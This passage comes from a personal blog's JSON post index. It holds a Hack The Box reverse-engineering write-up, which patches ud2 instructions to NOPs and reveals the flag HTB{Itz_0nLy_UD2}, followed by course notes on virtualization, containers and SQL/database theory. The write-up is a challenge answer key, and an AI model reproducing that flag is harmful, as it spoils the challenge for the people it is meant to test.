Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"}]},{"title":"HTB_rev Behind the Scenes","slug":"CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes","date":"2025-03-12T01:22:42.000Z","updated":"2025-03-25T19:32:23.215Z","comments":true,"path":"2025/03/12/CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes/","permalink":"https://archer-baiyi.github.io/2025/03/12/CTF/Reverse%20Engineering/HTB-rev-Behind-the-Scenes/","excerpt":"","text":"用010 Editor （或者Hex Editor之类的都行）打开源文件，将里面所有的 0F 0B （即 ud2 ）改为 90 90 （90即NOP，是Machine Code中表示 无操作 (No Operation) 的命令），然后再用IDA打开文件即可看到完整的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __fastcall main(int argc, const char **argv, const char **envp){ struct sigaction s; // [rsp+10h] [rbp-A0h] BYREF unsigned __int64 v5; // [rsp+A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, sizeof(s)); sigemptyset(&amp;s.sa_mask); s.sa_handler = (__sighandler_t)segill_sigaction; s.sa_flags = 4; sigaction(4, &amp;s, 0LL); if ( argc == 2 ) { if ( strlen(argv[1]) == 12 ) { if ( !strncmp(argv[1], \"Itz\", 3uLL) ) { if ( !strncmp(argv[1] + 3, \"_0n\", 3uLL) ) { if ( !strncmp(argv[1] + 6, \"Ly_\", 3uLL) ) { if ( !strncmp(argv[1] + 9, \"UD2\", 3uLL) ) printf(\"&gt; HTB{%s}\\n\", argv[1]); return 0; } else { return 0; } } else { return 0; } } else { return 0; } } else { return 0; } } else { puts(\"./challenge &lt;password&gt;\"); return 1; }} 所以flag为 1HTB{Itz_0nLy_UD2}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"}]},{"title":"GBS 9 Virtualisierung 虚拟化","slug":"TUM笔记/GBS/GBS-9-Virtualisierung-虚拟化","date":"2025-03-11T17:17:37.000Z","updated":"2025-03-25T19:33:18.158Z","comments":true,"path":"2025/03/11/TUM笔记/GBS/GBS-9-Virtualisierung-虚拟化/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-9-Virtualisierung-%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"操作系统基础相关笔记","text":"Einführung Abstraktionssichten: 复杂系统可以通过抽象层更好地描述。 Fokus auf relevante Funktionalitäten 抽象层通过接口（Interfaces）相互分离（durch Schnittstellen (Interfaces) voneinander getrennt）： 使得每一层可以独立开发和实现，并且高层系统只需要与接口交互，而不需要了解底层实现。 z.B. Systemcalls: Implementierung durch Interface verborgen ： 只需要直接用read(), write()这些命令，不需要关注/知道这些调用在内核中的具体实现。 Interfaces können die Software Sicht auf die Hardware definieren ：软件可以通过接口来访问硬件，而无需直接操作硬件。 Interfaces Instruction Set Architecture (ISA): 指令集架构 Interface zwischen dem BS und Hardware 是操作系统与硬件之间的接口 besteht aud User- und System-ISA Application Binary Interface (ABI): 应用二进制接口 Interface zwischen Anwendungen und dem Betriebssystem 是应用程序与操作系统之间的接口 besteht aus dem System Call Interface und der User ISA Die Sicht auf das System hängt von der Software-Perspektive ab： 如果是开发操作系统的话，则需要考虑操作系统与硬件的交互接口（isa）； 而如果是开发普通软件的话，则更关注软件与操作系统的接口（abi），相当于通过操作系统来访问硬件。 Ein Hardware-System (physische Maschine) bietet eine Laufzeitumgebung für die darüberliegende Software： BS virtualisiert bereits: Prozesse, virtueller Speicher und Abstraktionen Eine Virtuelle Maschine implementiert eine virtuelle Laufzeitumgebung： Abbilden von virtuellen auf physische Ressourcen 虚拟运行环境的分类 System Virtual Machines（系统虚拟机） 虚拟化整个系统 Process Virtual Machines（进程虚拟机） 仅为单个进程提供虚拟环境 Anforderungen an Virtualisierung 对虚拟化的要求 Equivalences / Fidelity：等效性 虚拟化应该让操作系统和应用程序无需特殊修改（或者最小程度的改动）便可以在虚拟机上运行。 Resource Control / Safety (Isolation)： 隔离性 必须确保虚拟机（的资源）彼此不会影响；Hypervisor需要控制所有底层资源 Efficiency / Performance：性能 大部分指令应该直接在硬件上执行 系统虚拟机 （System Virtual Machines）我们为什么需要系统虚拟机？ 模拟（Emulation） 使得操作系统可以在不同的 ISA上运行，并且在虚拟机中调试操作系统通常比在物理硬件（裸机）上更方便。 隔离（Isolation） 受损或遭到攻击的 Guest OS 无法影响其他虚拟机，也无法修改 Hypervisor 本身。 安全性（Sicherheit） Hypervisor 更容易保护（代码量较小、权限较高）。 资源利用（Ressourcennutzung） 物理硬件资源可以更好（更灵活）地分配和利用。 Hypervisor / Virtual Machine Monitor (VMM) 虚拟机监控器Hypervisor负责给操作系统提供运行环境，通常会分为2类： Typ 1 Hypervisor /Bare-Metal-Hypervisor （裸机式） 直接在物理硬件上运行容器，没有额外虚拟化层的存在。这种方式的主要优点在于性能的极致优化，因为没有虚拟化带来的开销。 比如 Xen, Hyper-V, VMware ESX。 Typ 2 Hypervisor （托管式） 依赖于宿主操作系统的服务（ Verwendet Dienste des Host-BS）。 比如 KVM, VirtualBox, VMware Workstation。 Hypervisor实现了一个虚拟的 ISA，同样分User- 和 System-ISA。 Hypervisor虚拟化整个物理机器，并且提供虚拟化硬件作为借口让Gast-BS可以在上面运行。可以使得Gast-BS以为/产生错觉（Illusion）自己对硬件拥有完整的控制权。但实际上对于Hypervisor来说，Gast-BS就只是个软件而已。 这样做的好处就是一个虚拟机可以运行任意操作系统，并且可以同时运行多个相同或不同的操作系统。 Hypervisor 负责控制和虚拟化系统的硬件资源： CPU 虚拟化（CPU-Virtualisierung） 内存虚拟化（Speicher-Virtualisierung） I/O 虚拟化（I/O-Virtualisierung） 并需要确保Gast-BS不能访问未分配给它的资源。 CPU 虚拟化（CPU-Virtualisierung）CPU 的虚拟化方法一般是分以下3种： 半虚拟化（Paravirtualization）： 使用经过修改的操作系统 在虚拟机（VM）中运行，该 OS 知道自己处于虚拟化环境中。 设备驱动程序（Geräte Treiber）会通过 Hypercalls 与Hypervisor进行交互。 二进制翻译（Binary Translation）： 可以运行未经修改的操作系统，甚至可以在不同架构上运行（例如 x86 上模拟 ARM）。 Hypervisor会解释/模拟Gast-BS的部分二进制代码，所以会导致性能开销（Performance-Overhead） 这种Hypervisor的实现非常复杂。 硬件辅助虚拟化（Hardware-assisted Virtualization） 可以运行未经修改的操作系统，可以实现高效的虚拟机（effizienten VMs），减少性能损失。所以是目前最主流的。 与普通操作系统中的内核空间（Kernel Space）与用户空间（User Space）不同（但相似）的是，我们这里会讨论的是高权限的 系统模式（System Mode） 和 用户模式（User Mode）。Hypervisor 会在系统模式（System Mode）运行，而Guest-BS则是会在用户模式（User Mode）运行。 某些在用户模式下执行的指令会被 Hypervisor 在系统模式下拦截，以确保Hypervisor 拥有对虚拟机的完全控制。 （套娃，User Mode里又有Virtual User Mode 和Virtual System Mode。） ISA中的指令可以分为以下3类： 特权指令（Privileged Instructions）： 只能在系统模式（System Mode）下执行。 如果在用户模式（User Mode）下执行，则会触发陷阱（Trap），由 Hypervisor 处理。 敏感指令（Sensitive Instructions）： 其中又分为 控制敏感指令（Control-Sensitive Instructions）：将修改系统配置（例如 修改页表（Page Tables）） 与行为敏感指令（Behaviour-Sensitive Instructions）：这些指令在不同模式下（用户模式 vs. 系统模式）的行为也是不同的。 无害指令（Innocuous Instructions）： 不属于前2类的则都属于这类。 虚拟化需要确保其中的敏感指令（Sensitive Instructions）必须是特权指令（Privileged Instructions）的子集。 反例可以参考x86架构中的POPF 指令（从栈加载标志寄存器 Flags）。 内存虚拟化（Speicher-Virtualisierung）在正常的非虚拟化情况下，操作系统（OS） 会直接管理物理内存并分配给不同的进程，利用前面学到的Seitentabelle(Page Table)。但在虚拟化的情况下，Hypervisor 需要作为最高管理者（übergeordnete Instanz）负责内存资源分配，确保Gast-BS不能随意访问物理内存且只能“看到”分配给它的部分。 下面介绍内存虚拟化的2中方法： 影子页表（Shadow Page Table, SPT） 硬件辅助的二级地址转换（Second Level Address Translation, SLAT） 影子页表（Shadow Page Table, SPT）在这个方法里一共存在三个内存抽象层： 物理内存 （Host-Physische Adressen, HPA） Hypervisor 对物理内存的抽象 即分配给Gast-BS的内存 （Gast-Physische Adressen）。这些内存对于Gast-BS来说是连续的，但是在实际的物理内存里不一定连续。 虚拟内存（ Virtueller Speicher） Guest OS 维护自己的页表（这些页表 不会 被 MMU（内存管理单元） 直接使用。），而Hypervisor维护影子页表（SPT）。为了保持页表的同步，Gast-BS只能以只读（Read-Only）方式访问它的页表，任何写入页表的尝试都会被 Hypervisor 拦截（Trap），让Hypervisor好更新Gast-BS的页表与SPT。 相当于影子页表是中间的那层页表。 SPT的问题也很显而易见：管理起来非常复杂而且开销很高（hoher Overhead）。 二级地址转换（Second Level Address Translation, SLAT）SLAT 由 CPU 提供硬件支持，将Gast-BS看到的 Gast 物理地址 (Gast-Physische Adressen) 映射到主机物理地址 (HPA)。Hypervisor 仅在 Guest OS 访问未映射的地址时才介入，减少性能开销。 例子： Intel Extended Page Tables (EPT), AMD Nested Page Tables (NPT) 虚拟机的内存管理跟进程管理的内存分配问题类似，我们也需要考虑该给每台虚拟机分配多少内存。 静态分配会导致不灵活，占用固定资源的问题。 动态分配的原理则是过量分配（Overcommitment）（假设并非所有 VMs 同时需要全部已分配的内存。）但这样会在回收已分配的内存时碰到问题，因为Hypervisor 无法知道哪些内存页是重要的，哪些可以释放。 为了解决这个问题我们可以使用 Ballooning (“balloon driver”)：Gast-BS内部的软件与Hypervisor进行通信：（没有内存压力的虚拟机）释放内存（“气球放气”）；申请内存（”给气球充气“）。 I/O 虚拟化（I/O-Virtualisierung）介绍几种I/O 虚拟化的技术： 完整虚拟化/仿真（Full Virtualization/Emulation）Hypervisor管理所有 Guest VM 的I/O请求，调度I/O资源。 Hypervisor 通过软件多路复用（multiplext）或仿真（emuliert）I/O 设备。 Hypervisor会拦截Guest VM的I/O请求，并将其转发到物理 I/O 设备。 优势： 高效 Gemultiplexte I/O-Geräte sind effizient； 透明 Transparentes Geräte-Management。 问题： 实现起来太复杂； Hypervisor 需要为多种 I/O 设备提供驱动程序。； 如果 I/O 设备完全仿真（Emulation），会产生较高的性能开销（Overhead）。 半虚拟化（Paravirtualization）将 I/O 设备驱动分为两部分 使用拆分驱动架构（Split-Driver-Architektur） 后端驱动（Backend-Treiber）：运行在 Hypervisor 或 I/O 处理 VM 内，实际管理物理设备。 前端驱动（Frontend-Treiber）：运行在 Gast-BS 内，与后端驱动通信。 优势： 开销更低（Geringer Overhead）； 更容易实现； Guest OS 适配更灵活，可以通过 已有驱动支持新设备。 问题： Guest OS 需要额外修改或安装特定驱动。 设备域（Device Domains）一台VM充当所有I/O设备的接口（在Xen中称为Domain 0或”dom0”），其他VMs通过这台VM访问I/O设备，而不是直接访问硬件。 直接 I/O 访问（Direct I/O）使用硬件支持的 I/O 设备多路复用（Multiplexing）。 I/O-MMU（I/O 内存管理单元） 负责管理 Guest VM 的设备内存： 负责 I/O 地址和中断（Interrupt）的映射。 隔离 DMA（直接内存访问）请求，防止 VMs 互相干扰。 优势： Guest VM 直接访问物理设备，提高 I/O 效率。 部分 I/O 处理由硬件完成，减少 Hypervisor 负担。 单根 I/O 虚拟化（Single Root I/O Virtualization, SR-IOV）I/O 设备本身支持虚拟化，将 一个物理设备拆分为多个虚拟功能（ Virtual Functions，VF），会绕过Hypervisor的I/O处理。 Gast VM 看到的是一个独立的 I/O 设备，但实际上它共享了同一个物理设备。 （感觉大部分虚拟化的技术都是通过减轻Hypervisor的负担来提高效率的） 进程虚拟机（Process Virtual Machines）跟系统虚拟机不同的是，进程虚拟机（Process VM）只给单个（或者多个）进程提供虚拟运行环境，使应用程序可以独立于底层操作系统和硬件架构运行。 Runtime会给用户空间进程（User-Space-Prozesse）提供虚拟运行环境，并且负责实现 ABI接口（由系统调用接口（Systemcall Interface）和用户指令集架构（User-ISA）组成）。简单来讲就是Runtime需要负责转换/翻译Systemcall和ISA的指令。 对应用程序来说，整个“系统”由 ABI 接口决定，而不依赖底层硬件或操作系统。 Runtime是类似于Hypervisor的中间层，但他们的核心作用之类的完全不一样。 进程虚拟机的优势： 仿真（Emulation）：程序可以在不同 ISA（指令集架构）上运行。 平台无关性（Plattform-Unabhängigkeit）：程序可以在不同 OS 运行。 性能优化（Performance-Optimierung）：二进制优化器（Binary Optimizer）会优化代码。 高级语言虚拟机（High-Level-Language VMs, HLL VMs）作为进程虚拟机的一种，会提供一个与底层架构无关的虚拟 ISA（ Plattform-unabhängige virtuelle ISA），使得应用程序不依赖特定的操作系统（OS）和硬件架构。主要是为了运行高级编程语言的代码。 比如说 Java Virtual Machine (JVM) 可以解释和执行 Java 字节码（Java Bytecode），让 Java 代码可以在 Windows、Linux、Mac 等不同平台 上运行。 如果多个进程需要共享资源并相互交互（interagieren），则通常使用操作系统级虚拟化（OS-level Virtualization）。 操作系统级虚拟化（OS-level-Virtualization）操作系统级虚拟化（OS-level-Virtualization）可以运行多个隔离的应用进程，共享同一个操作系统（OS）。 Container Leichtgewichtige Virtualisierungsmöglichkeit 轻量化 stellen eine Laufzeitumgebung für User-Space-Prozesse bereit BS wird nicht virtualisiert Isolation von Prozessen möglich Container是OS-Level Virtualization的一种实现。 在传统的 Unix 操作系统中，一些资源是全局管理的，比如说PID, UID (User ID), IP-Addresse, Host- und NIS-Domainnamen，使得具有 root 权限的进程可以访问和影响其他进程，带来安全隐患。所以希望将他们隔离开。 Namespaces 是 Container 的基础：抽象出对系统全局资源的访问 （比如说Filesystem-Mount-Points, Netzressourcen, PIDs, etc.），将所有进程拆成disjoint subsets，使得每个subset里的进程会认为自己是整个系统中唯一的进程。 Jede Ressource ist eindeutig innerhalb eines Namespace-Containers Bestandteile von Container unter LinuxNamespaces作用：Benennung und Adressierung von Ressourcen，实现进程级别的资源隔离。 主要负责隔离。 在实际应用中，我们不总是需要隔离所有系统资源。因此，Linux 提供了多个独立的 Namespace，以实现更灵活的隔离方式，并避免不必要的资源浪费： UTS: Unix Time Sharing (System) Isolieren System-Identifier (z.B.Host- und Domainnamen 主机名和域名) 例如，在 Docker 容器中，每个容器可以拥有自己的主机名，而不会影响宿主机。 IPC: Inter-Process Communication isolieren IPC-Ressourcen 隔离进程间通信、 例如，不同的容器不能访问彼此的共享内存和消息队列，提高安全性。 Network: isolieren Netzressourcen 隔离网络设备、IP 地址、端口、路由表等，允许不同 Namespace 拥有独立的网络栈。 PID: isolieren PID-Räume Prozesse in unterschiedlichen PID-Namespaces können dieselbe PID haben, aber eindeutig innerhalb eines PID-Namespace Es können verschachtelte (engl. nested) PID-Namespaces erstellt werden 可以套娃 在同一 PID 命名空间内，进程可以正常通信；在不同 PID 命名空间之间，父 Namespace 可以向子 Namespace 发送信号，但子 Namespace 不能影响父 Namespace。 Mount: isolieren Mount-Points des Dateisystems 隔离文件系统挂载点，允许不同的 Namespace 看到不同的文件系统视图。 （在 Linux 中，挂载点（Mount Point） 是指将一个文件系统连接到目录结构中的特定位置，使其内容可以通过该目录访问。） 挂载类型 (Mount-Typ)： Shared Mount 共享挂载：接收+传递 该挂载点的 mount 和 umount 事件会在 Peer Group 之间传播。 例如，在 Shared Mount 上挂载一个新目录，所有共享该挂载点的进程都会看到这个变更。 Private Mount 私有挂载：不接收+不传递 挂载点不会接收，也不会向对等组（Peer Groups）传递事件。 Der Mount-Point empfängt und leitet keine Events zu Peer Groups weiter. Slave Mount 从属挂载：接收+不传递 Slave-Mount-Points empfangen Events von einer Master Peer Group. Unbinable Mount 不可绑定挂载： Ist ein Private Mount, der nicht gebunden (Bind Mount) werden kann. 不能被绑定的私人挂载。 (Bind Mount指的是允许将一个目录或文件挂载到另一个位置，使其在多个路径下可见。) Peer Groups（对等组）：Peer Group 是一组共享 mount 事件的挂载点，当一个 Shared Mount 被创建时，它会被添加到某个 Peer Group。所有 Peer Group 内的挂载点都会同步 mount 和 umount 事件。 User: isolieren User- und Group-IDs 隔离用户 ID 和权限 Erhöhte Privilegien sind nur innerhalb des User Namespace gültig. können auch verschachtelte User-Namespaces erstellt werden. 套娃 例如，容器内的 root 实际上是宿主机的普通用户，增强安全性。 Linux Control Groups (cgroups)主要负责限制。 作用： cgroups unterteilen Prozesse in hierarchische Gruppen 将进程划分为层次化的组 分配( Allozieren )和分发( verteilen )每一组的系统资源 （CPU, 内存等） 资源由独立的 cgroup 子系统表示 Jedes Subsystem verwaltet eine Hierarchie an Prozessgruppen Accounting Überwacht Seiten, die von den Prozessgruppen verwendet werden 监控进程使用的内存 Kontrolle weiche Speichergrenzen 确保内存页会被回收（但不是强制的，即在系统压力下会优先释放，但不会立即强制回收） harte Speichergrenzen 会触发 Out-of-Memory-Killer 所有该 cgroup 内的进程会被冻结。 OOM Killer 可能会终止进程或调整内存限制。 如果内存使用量下降到限制以下，进程可以恢复运行。 Secure Computing Mode (Seccomp)用于限制进程可以执行的系统调用（System Calls）。 提供 3 种模式： Disabled： 未启用，可以调用所有 System Call Strict： 只能调用4个：read(), write(), exit() 和 sigreturn() （sigreturn() 是一个 系统调用（syscall），用于 从信号处理程序（signal handler）返回到被中断的进程上下文。） 调用其他的会触发SIGKILL信号。 Filter： 只能使用被过滤过的System Call。 Filter会基于Berkeley Packet Filter (BPF)。 库操作系统（Library OS）其实虚拟机（VM）和Container还是有些问题的： 通用性（Universell）：内核（Kernel）并未针对特定应用进行优化。 额外开销（Overhead）：包含未使用的组件，带来以下问题： 镜像（Abbilder，指的是 VM 或容器的系统镜像（System Image），包含操作系统和应用程序的文件。）过大会导致部署（Deployment，指的是 将 VM 或容器的镜像部署到运行环境中的过程。）变慢。 攻击面（Angriffsfenster）过大，增加安全风险。 容器通常只为一个用户提供一个应用，所以包含许多不必要的功能。 所以我们可以考虑将 VM 作为一个应用进行编译（即 Library OS），用于创建一个最小化、专门针对特定应用优化的虚拟机。 Library OS 会像一个库（Bibliothek）一样运行。在编译过程中，仅包含所需的功能，整个系统可以通过编译器进行优化。一般只会运行一个进程（但支持多线程）。 Library OS 的理念可以理解为：将每个应用程序所依赖的 OS(操作系统) 的 personality(特性) 作为 library(库) ，使其独立地运行在该应用程序的地址空间上。 这种VM 被称为 Unikernel，意味着所有执行都在内核模式（Kernel Mode）进行，并且只有一个地址空间，因为整个 Unikernel 就是一个单进程应用。 缺点：应用程序必须经常进行调整（angepasset werden），因为它们在内部调用其他应用程序，但架构不支持这种调用。核心原因就是不支持多个进程交互。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/tags/container/"}]},{"title":"GBS-1-Einführung","slug":"TUM笔记/GBS/GBS-1-Einführung","date":"2025-03-11T17:15:25.000Z","updated":"2025-03-25T19:33:01.459Z","comments":true,"path":"2025/03/11/TUM笔记/GBS/GBS-1-Einführung/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-1-Einf%C3%BChrung/","excerpt":"操作系统基础相关笔记","text":"Grundlagen: Betriebssysteme und SystemsoftwareAufgabe der Informatik:","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Datenbank 笔记","slug":"TUM笔记/Datenbank/Datenbank-笔记","date":"2025-03-11T10:37:03.000Z","updated":"2025-03-25T19:32:36.783Z","comments":true,"path":"2025/03/11/TUM笔记/Datenbank/Datenbank-笔记/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%E7%AC%94%E8%AE%B0/Datenbank/Datenbank-%E7%AC%94%E8%AE%B0/","excerpt":"数据库基础相关笔记","text":"1. Datenbankentwurf / ER-ModellierungEntity-relationship diagram Funktionalitäten: 1:1, 1:N, N:1, N:M Min-Max: (min,max) Multiplizität 2. Das Relationale ModellSchlüssel, Primärschlüssel Relationen mit gleichem Schlüssel kann man zusammenfassen. Anomalie: 异常 Die Relationale Algebra Selektion Projektion (会自动去重) Kreuzprodukt Join (Verbund) Umbenennung Mengendifferenz Division Vereinigung Mengendurchschnitt Semi-Join (linkes Argument wird gefiltert) (筛选左表，仅保留在右表中有匹配记录的左表行。) Semi-Join (rechtes Argument wird gefiltert) Anti-Semi-join ⟕ linker äußerer Join (会保留左表中的所有记录，即使在右表中没有匹配的记录时，右表对应的位置会以 NULL 填充。) ⟖ rechter äußerer Join ⟗ (voller) äußerer Join Der Relationenkalkül (relationaler Tupelkalkül) Bsp.: Der Domänenkalkül Bsp.: ü Diese 3 Sprachen sind gleich mächtig 3. SQLstandadisierte -Datendefinitions (DDL)- -Datenmanipulations (DML)- -Anfrage (Query)-Sprache Datendefinition (DDL)Datentypen: character(n), char(n) character varying(n), varchar(n) numeric(p,s), integer, decimal p（precision，精度）：数值的总位数（包含小数点前后的所有数字）。 s（scale，小数位数）：小数部分的位数（小数点后的位数）。 blob oder raw – für sehr große binäre Daten clob – für sehr große String-Attribute date – für Datumsangaben xml – für XML-Dokumente 1234create table Professoren ( PersNr integer not null, Name varchar(30) not null, Rang character(2)); DatenmanipulationEinfügen von Tupeln 1234insert into hörenselect MatrNr, VorlNrfrom Studenten, Vorlesungenwhere Titel = 'Logik'; 12insert into Studenten (MatrNr, Name)values (28121, 'Archimedes'); Löschen von Tupeln 12delete Studentenwhere Semester &gt; 13; Verändern von Tupeln 12update Studentenset Semester = Semester + 1; Anfrage123select (distinct) asfromwhere and Sortieren: 123select PersNr, Name, Rangfrom Professorenorder by Rang desc, Name asc; Mengenoperation: 1union, intersect, minus 12345selectfromwhere (not) exists (select from where)where not in () 比较： 1(where) value &gt;= ALL(子查询) Aggregationsfunktion: 1avg, max, min, count, sum Gruppierung: 1234selectfrom(where)group by Alle in der select-Klausel aufgeführten Attribute - außer den aggregierten - auch in der group by-Klausel aufgeführt werden. 比如说下面这里的gelesenVon, Name： 12345select gelesenVon, Name, sum(SWS)from Vorlesungen, Professorenwhere gelesenVon = PersNr and Rang = 'C4'group by gelesenVon, Name having avg(SWS) &gt;=3; Casting: 12cast(expression AS target_data_type)cast(h.AnzProVorl as decimal(6,2)) Allquantor und Implikation: ( \\forall t \\in R \\ (P(t)) ) \\Leftrightarrow ( \\neg (\\exists t \\in R \\ (\\neg P(t))) )(R \\Rightarrow T) \\Leftrightarrow (\\neg R \\lor T)Auswertung bei NULL-Werten and, between, in (1,2,3,4) like mit Platzhalter: “%” (für beliebig biele Zeichen) “_” (für genau ein Zeichen) case left/right/full outer join Rekursion Vorgänger des „Wiener Kreises“ der Tiefe n: 1234567891011select v1.Vorgängerfrom voraussetzen v1, ... voraussetzen vn_minus_1, voraussetzen vn, Vorlesungen vwhere v1.Nachfolger = v2.Vorgänger and ... vn_minus_1.Nachfolger = vn.Vorgänger and vn.Nachfolger = v.VorlNr and v.Titel = 'Der Wiener Kreis'; Mit Rekursion: 123456789101112131415161718192021with recursive TransVorl (Vorg, Nachf) as ( -- 递归的基础查询（初始层级） select Vorgänger, Nachfolger from voraussetzen union all -- 递归部分（从前一层继续查找更深的层级） select t.Vorg, v.Nachfolger from TransVorl t, voraussetzen v where t.Nachf = v.Vorgänger)select Titel from Vorlesungen where VorlNr in ( select Vorg from TransVorl where Nachf in ( select VorlNr from Vorlesungen where Titel = 'Der Wiener Kreis' )); 4. DatenintegritätIntegritätsbedingungen: -Schlüssel -Beziehungskardinalitäten -Attributdomänen -Inklusion bei Generalisierung Referentielle Integrität Fremdschlüssel Änderung von referenzierten Daten: Default 会拒绝执行主键的更改操作 cascade (Kaskadieren): 级联，外键会随着主键的更改一起更改 set NULL Statische Integritätsbedingungen: 12create table Studenten(Semester integer check Semester between 1 and 13) 12create table Prof(Rang character(2) check(Rang in ('C2','C3','C4'))) Konsistenzbedingung: 1234567create table prüfen(MatrNr ···VorNr ···Note ···primary key (MatrNr,VorNr))constraint VorherHören check (···) Trigger: 123456789101112131415161718192021-- 1. create trigger keine Degradierung-- 2.before update on Professorenfor each row-- 3.when (old.Rang is not null)begin-- 4. if :old.Rang = 'C3' and :new.Rang = 'C2' then :new.Rang := 'C3'; end if; if :old.Rang = 'C4' then :new.Rang := 'C4'; end if; if :new.Rang is null then :new.Rang := :old.Rang; end if;end; create trigger Anweisung, gefolgt von einem Namen, der Definition des Auslösers, in diesem Fall bevor eine Änderungsoperation (before update on) auf einer Zeile (for each row) der Tabelle Professoren ausgeführt werden kann, einer einschränkenden Bedingung (when) und einer Prozedurdefinition in der Oracle-proprietären Syntax. Temporale Daten 5. Relationale EntwurfstheorieFunktionale AbhängigkeitenFunctional Dependency (FD) A B C D a4 b2 c4 d3 a1 b1 c1 d1 a1 b1 c1 d2 a2 b2 c3 d2 a3 b2 c4 d3 R:= {A,B,C,D} 假设 : (可以理解成函数的 rechtseindeutig) Super-Schlüssel : ( 生成元) voll funktional abhängig von () : kann nicht mehr verkleinert werden () Kandidaten-Schlüssel: ( 最小生成元) Armstrong-Axiome FD-Hülle einer Attributmenge Kanonische Überdeckung 没有冗余的属性(Attribute)和依赖(Abhängigkeit) Berechnung: 消除右部冗余属性 (, 时仅保留 和 ) 消除左部冗余属性 删除冗余的函数依赖 (，， 时仅保留 和 ) R = R1 R2 2 Korrektheitskriterien für die Zerlegung von Relationenschemata: Verlustlosigkeit Abhängigkeitserhaltung verlustlose Zerlegung: ( R = R1 R2 ) Hinreichende Bedingung für die Verlustlosigkeit einer Zerlegung: oder NormalformenErste Normalform (1NF): Nur atomare Domäne. 都要是singleton，不能出现集合或者重复行 反例： Vater Mutter Kinder Johann Martha {Else, Lucie} Johann Maria {Theo, Josef} Heinz Martha {Cleo} 正例： Vater Mutter Kind Johann Martha Else Johann Martha Lucie Johann Maria Theo Johann Maria Josef Heinz Martha Cleo Zweite Normalform (2NF)： falls jedes Nicht(kandidat)schlüssel-Attribut voll funktional abhängig ist von jedem Kandidatenschlüssel der Relation. 假设R:= {A,B,C,D}的Kandidaten-Schlüssel是{A,B},那么需要满足C,D sind voll funktional abhängig von {A,B}。 只要出现类似{A} {C}之类的就不行了。 可以理解成不能有多余列。 Remark: 如果Kandidaten-Schlüssel只有一个元素，那么一定满足2NF。 反例（1非2）： A B C x a 1 x b 1 y c 2 {A,B}为Kandidaten-Schlüssel。有{A} {C}。 Dritte Normalform (3NF)： wenn für jede für geltende funktionale Abhängigkeit der Form mit und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial Das Attribut ist in einem Kandidatenschlüssel von enthalten – also ist prim ist Superschlüssel von 假如{A,B}是Kandidatenschlüssel，那么可以{C,D} {A}是符合第二条要求的。（但是这个不满足后面的BCNF） 反例（2非3）： A B C D x a 1 n x b 2 m y c 2 m 满足{A,B} {C}， {A,B} {D} voll，所以满足2NF； 有{C} {D}，所以不满足3NF。 Synthesealgorighmus: zerlegen R in R1,…,Rn, sodass: R1,…,Rn verlustlos R1,…,Rn abhägigkeitserhaltend Alle R1,…,Rn in 3NF Boyce-Codd-Normalform (BCNF)： wenn für jede für geltende funktionale Abhängigkeit der Form (FDs) und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial ist Superschlüssel von 反例（3非BCNF）： A B C D x a 1 1 x b 2 1 y a 3 2 y b 2 1 有 AB CD C B 因为B属于Kandidatschlüssel，所以满足3NF，但是不满足BCNF。 Man kann jede Relation verlustlos 